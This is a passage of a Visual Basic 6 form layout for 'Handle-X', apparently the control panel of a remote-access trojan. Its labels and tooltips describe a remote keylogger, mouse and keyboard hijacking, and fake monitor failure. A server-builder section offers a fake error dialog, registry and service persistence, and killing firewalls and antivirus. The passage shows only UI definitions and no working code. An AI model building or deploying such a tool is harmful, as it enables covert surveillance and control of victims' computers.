            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   14
         Left            =   7680
         MouseIcon       =   "frm_main.frx":444B2
         MousePointer    =   99  'Custom
         TabIndex        =   200
         ToolTipText     =   "Cancel Monitor Faking"
         Top             =   3660
         Width           =   735
      End
      Begin VB.Label bar 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "%"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   4560
         TabIndex        =   193
         Top             =   2160
         Width           =   225
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Right Click"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   28
         Left            =   3000
         MouseIcon       =   "frm_main.frx":447BC
         MousePointer    =   99  'Custom
         TabIndex        =   163
         ToolTipText     =   "Right click on the remoted system at the desired X,Y"
         Top             =   4440
         Width           =   1215
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Left Click"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   27
         Left            =   3000
         MouseIcon       =   "frm_main.frx":44AC6
         MousePointer    =   99  'Custom
         TabIndex        =   162
         ToolTipText     =   "Left click on the remoted system at the desired X,Y"
         Top             =   3960
         Width           =   1215
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Return"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   26
         Left            =   4800
         MouseIcon       =   "frm_main.frx":44DD0
         MousePointer    =   99  'Custom
         TabIndex        =   161
         ToolTipText     =   "Return Normal"
         Top             =   3480
         Width           =   855
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Swap Pointer"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   25
         Left            =   3000
         MouseIcon       =   "frm_main.frx":450DA
         MousePointer    =   99  'Custom
         TabIndex        =   160
         ToolTipText     =   "Swap the mouse pointers"
         Top             =   3480
         Width           =   1695
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Show"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   24
         Left            =   4800
         MouseIcon       =   "frm_main.frx":453E4
         MousePointer    =   99  'Custom
         TabIndex        =   159
         ToolTipText     =   "Show"
         Top             =   3000
         Width           =   855
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Hide Pointer"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   23
         Left            =   3000
         MouseIcon       =   "frm_main.frx":456EE
         MousePointer    =   99  'Custom
         TabIndex        =   158
         ToolTipText     =   "Hide the pointer"
         Top             =   3000
         Width           =   1695
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Mouse Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   240
         Index           =   15
         Left            =   2910
         TabIndex        =   157
         Top             =   2640
         Width           =   2820
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   22
         Left            =   4920
         MouseIcon       =   "frm_main.frx":459F8
         MousePointer    =   99  'Custom
         TabIndex        =   156
         ToolTipText     =   "Set This Value As a percent to the sound level at the remoted system"
         Top             =   2160
         Width           =   615
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   21
         Left            =   3120
         MouseIcon       =   "frm_main.frx":45D02
         MousePointer    =   99  'Custom
         TabIndex        =   154
         ToolTipText     =   "Get The Sound level at the remoted system"
         Top             =   2160
         Width           =   615
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Free Control Over Sound"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   20
         Left            =   3120
         MouseIcon       =   "frm_main.frx":4600C
         MousePointer    =   99  'Custom
         TabIndex        =   153
         ToolTipText     =   "Leave The Control over the sound level."
         Top             =   1680
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Take Control Over Sound"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   19
         Left            =   3120
         MouseIcon       =   "frm_main.frx":46316
         MousePointer    =   99  'Custom
         TabIndex        =   152
         ToolTipText     =   "Talk the control over the sound level there at the remoted system by the value u set before from [Set] Button."
         Top             =   1200
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Initialize Sound Card To Be Controlled"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   495
         Index           =   18
         Left            =   3120
         MouseIcon       =   "frm_main.frx":46620
         MousePointer    =   99  'Custom
         TabIndex        =   151
         ToolTipText     =   "Initialize Sound Card To Be Controlled"
         Top             =   600
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Stop Key Logger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   16
         Left            =   240
         MouseIcon       =   "frm_main.frx":4692A
         MousePointer    =   99  'Custom
         TabIndex        =   150
         ToolTipText     =   "Stop the keylogger from logging the keys at the remoted system"
         Top             =   4560
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Start Key Logger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   15
         Left            =   240
         MouseIcon       =   "frm_main.frx":46C34
         MousePointer    =   99  'Custom
         TabIndex        =   149
         ToolTipText     =   "Start The KeyLogger,It Will Send You The Keys with each refranced window title"
         Top             =   4088
         Width           =   2415
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   57
         X1              =   0
         X2              =   0
         Y1              =   5160
         Y2              =   480
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   56
         X1              =   0
         X2              =   2880
         Y1              =   3862
         Y2              =   3862
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Fake Monitor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   13
         Left            =   6000
         MouseIcon       =   "frm_main.frx":46F3E
         MousePointer    =   99  'Custom
         TabIndex        =   148
         ToolTipText     =   "Fake The Monitor to be Brocken Down"
         Top             =   3660
         Width           =   1575
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Set Monitor Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   12
         Left            =   6000
         MouseIcon       =   "frm_main.frx":47248
         MousePointer    =   99  'Custom
         TabIndex        =   147
         ToolTipText     =   "Set The Sellected Setting in the llist"
         Top             =   3210
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Monitor Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   11
         Left            =   6000
         MouseIcon       =   "frm_main.frx":47552
         MousePointer    =   99  'Custom
         TabIndex        =   145
         ToolTipText     =   "Get the list of available settings working on the remoted system monitor"
         Top             =   2760
         Width           =   2415
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Display Monitor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   240
         Index           =   14
         Left            =   5780
         TabIndex        =   144
         Top             =   300
         Width           =   2830
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Sound Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   240
         Index           =   13
         Left            =   2910
         TabIndex        =   143
         Top             =   300
         Width           =   2820
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "General Stuff"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   240
         Index           =   12
         Left            =   10
         TabIndex        =   142
         Top             =   300
         Width           =   2850
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Num off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   10
         Left            =   1560
         MouseIcon       =   "frm_main.frx":4785C
         MousePointer    =   99  'Custom
         TabIndex        =   141
         ToolTipText     =   "Force The NumLock button to On"
         Top             =   3396
         Width           =   1095
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Num on"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   9
         Left            =   240
         MouseIcon       =   "frm_main.frx":47B66
         MousePointer    =   99  'Custom
         TabIndex        =   140
         ToolTipText     =   "Force The NumLock button to On"
         Top             =   3396
         Width           =   1095
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Caps off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   8
         Left            =   1560
         MouseIcon       =   "frm_main.frx":47E70
         MousePointer    =   99  'Custom
         TabIndex        =   139
         ToolTipText     =   "Force The CapsLock button to Off"
         Top             =   2930
         Width           =   1095
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Caps on"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   240
         MouseIcon       =   "frm_main.frx":4817A
         MousePointer    =   99  'Custom
         TabIndex        =   138
         ToolTipText     =   "Force The CapsLock button to On"
         Top             =   2930
         Width           =   1095
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Turn-on Monitor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   6000
         MouseIcon       =   "frm_main.frx":48484
         MousePointer    =   99  'Custom
         TabIndex        =   137
         ToolTipText     =   "Turn Monitor On Again"
         Top             =   4560
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Turn-off Monitor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   5
         Left            =   6000
         MouseIcon       =   "frm_main.frx":4878E
         MousePointer    =   99  'Custom
         TabIndex        =   136
         ToolTipText     =   "Turn-off The Monitor"
         Top             =   4110
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Allow Mouse&&Keyboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   240
         MouseIcon       =   "frm_main.frx":48A98
         MousePointer    =   99  'Custom
         TabIndex        =   135
         ToolTipText     =   "Allow The Mouse and Keyboard Of The Activated Window"
         Top             =   2464
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Stop Mouse&&Keyboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   3
         Left            =   240
         MouseIcon       =   "frm_main.frx":48DA2
         MousePointer    =   99  'Custom
         TabIndex        =   134
         ToolTipText     =   "Stop Mouse & Keyboard For The Activated Window and It Returned Back When The User Press ALT+CTRL+DEL"
         Top             =   1998
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Close CD-Rom"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   240
         MouseIcon       =   "frm_main.frx":490AC
         MousePointer    =   99  'Custom
         TabIndex        =   133
         ToolTipText     =   "Close The CD-Rom Door"
         Top             =   1532
         Width           =   2415
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Eject CD-Rom"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   240
         MouseIcon       =   "frm_main.frx":493B6
         MousePointer    =   99  'Custom
         TabIndex        =   132
         ToolTipText     =   "Open The CD-ROm Door"
         Top             =   1066
         Width           =   2415
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   55
         X1              =   2880
         X2              =   2880
         Y1              =   4920
         Y2              =   240
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   54
         X1              =   5760
         X2              =   5760
         Y1              =   4920
         Y2              =   240
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Hardware Manager :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   8
         Left            =   0
         TabIndex        =   131
         Top             =   0
         Width           =   8655
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   0
         Left            =   240
         MouseIcon       =   "frm_main.frx":496C0
         MousePointer    =   99  'Custom
         TabIndex        =   130
         ToolTipText     =   "Get Remoted System Information"
         Top             =   600
         Width           =   2415
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   9
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   2
      Top             =   4440
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox TxtEditServer 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   4
         Left            =   3480
         MaxLength       =   28
         TabIndex        =   184
         Text            =   "NewServer.exe"
         Top             =   1620
         Width           =   3015
      End
      Begin VB.CheckBox ChkBoxEditServer 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Fake Error ""Run Time Error!"" Appears On Server Start."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   4
         Left            =   2040
         TabIndex        =   119
         Top             =   3480
         Width           =   4455
      End
      Begin VB.CheckBox ChkBoxEditServer 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Set Start Up Method In Registry."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   3
         Left            =   2040
         TabIndex        =   118
         Top             =   3120
         Width           =   2775
      End
      Begin VB.TextBox TxtEditServer 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   260
         IMEMode         =   3  'DISABLE
         Index           =   3
         Left            =   120
         TabIndex        =   117
         Top             =   4560
         Width           =   8415
      End
      Begin VB.CheckBox ChkBoxEditServer 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Register as a Service After Running For The First Time."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   2
         Left            =   2040
         TabIndex        =   113
         Top             =   2760
         Width           =   4455
      End
      Begin VB.CheckBox ChkBoxEditServer 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Kill FireWalls And Antiviruses When Loaded."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   2040
         TabIndex        =   112
         Top             =   2400
         Width           =   3735
      End
      Begin VB.CheckBox ChkBoxEditServer 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Compress Server After Instalation."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   0
         Left            =   2040
         TabIndex        =   111
         Top             =   2040
         Width           =   3015
      End
      Begin VB.TextBox TxtEditServer 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   1
         Left            =   3480
         MaxLength       =   10
         TabIndex        =   109
         Top             =   920
         Width           =   3015
      End
      Begin VB.TextBox TxtEditServer 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   2
         Left            =   3480
         MaxLength       =   28
         TabIndex        =   110
         Top             =   1270
         Width           =   3015
      End
      Begin VB.TextBox TxtEditServer 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         IMEMode         =   3  'DISABLE
         Index           =   0
         Left            =   3480
         MaxLength       =   5
         TabIndex        =   108
         Text            =   "4000"
         Top             =   600
         Width           =   3015
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Server Name :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   19
         Left            =   2040
         TabIndex        =   183
         Top             =   1620
         Width           =   1260
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000015&
         BorderWidth     =   2
         Index           =   52
         X1              =   1680
         X2              =   1680
         Y1              =   3960
         Y2              =   480
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000015&
         BorderWidth     =   2
         Index           =   51
         X1              =   6840
         X2              =   1680
         Y1              =   480
         Y2              =   480
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000015&
         BorderWidth     =   2
         Index           =   50
         X1              =   6840
         X2              =   6840
         Y1              =   3960
         Y2              =   480
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000015&
         BorderWidth     =   2
         Index           =   49
         X1              =   6840
         X2              =   1680
         Y1              =   3960
         Y2              =   3960
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Password :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   8
         Left            =   2040
         TabIndex        =   116
         Top             =   970
         Width           =   975
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Email Address :-"
